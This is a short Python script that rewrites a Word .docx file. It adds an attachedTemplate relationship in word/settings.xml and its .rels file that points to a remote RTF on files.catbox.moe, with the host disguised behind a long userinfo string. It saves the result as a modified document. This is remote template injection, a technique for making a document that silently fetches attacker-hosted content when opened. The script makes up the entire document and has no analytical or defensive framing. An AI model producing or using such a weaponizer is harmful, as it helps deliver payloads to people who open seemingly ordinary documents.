from zipfile import ZipFile, ZIP_DEFLATED
from pathlib import Path
import tempfile
import shutil

src = Path("trang.docx")
out = Path("trang-modified.docx")

with tempfile.TemporaryDirectory() as tmp:
    tmp = Path(tmp)

    with ZipFile(src, "r") as z:
        z.extractall(tmp)

    settings = tmp / "word" / "settings.xml"

    text = settings.read_text(encoding="utf-8")

    injection = '<w:attachedTemplate r:id="tId1"/>'

    if injection not in text:
        text = text.replace(
            "</w:settings>",
            f"    {injection}\n</w:settings>"
        )
        settings.write_text(text, encoding="utf-8")

    rels_dir = tmp / "word" / "_rels"
    rels_dir.mkdir(parents=True, exist_ok=True)

    rels = rels_dir / "settings.xml.rels"

    rels.write_text("""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="tId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://hellofellowwandererwelcometothewiredletsconnectletalllovelain@files.catbox.moe/9kvhkl.rtf" TargetMode="External"/></Relationships>""", encoding="utf-8")

    with ZipFile(out, "w", ZIP_DEFLATED) as z:
        for path in tmp.rglob("*"):
            if path.is_file():
                z.write(path, path.relative_to(tmp))

print(f"Created: {out}")
